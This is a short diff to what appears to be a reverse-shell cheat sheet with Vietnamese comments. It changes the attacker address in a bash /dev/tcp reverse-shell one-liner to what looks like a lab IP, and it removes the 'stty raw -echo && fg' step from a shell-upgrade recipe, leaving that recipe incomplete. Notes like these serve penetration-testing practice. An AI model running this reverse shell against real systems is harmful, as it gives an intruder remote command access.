@@ -15,7 +15,7 @@
 ### bash
 
 ```bash
-bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.15.222/9001 0>&1"
 ```
 
 ### netcat
@@ -178,7 +178,8 @@ export TERM=xterm
 # Background shell
 Ctrl + Z
 
-stty raw -echo && fg
+
+
 
 # Nhấn Enter hai lần
 ```
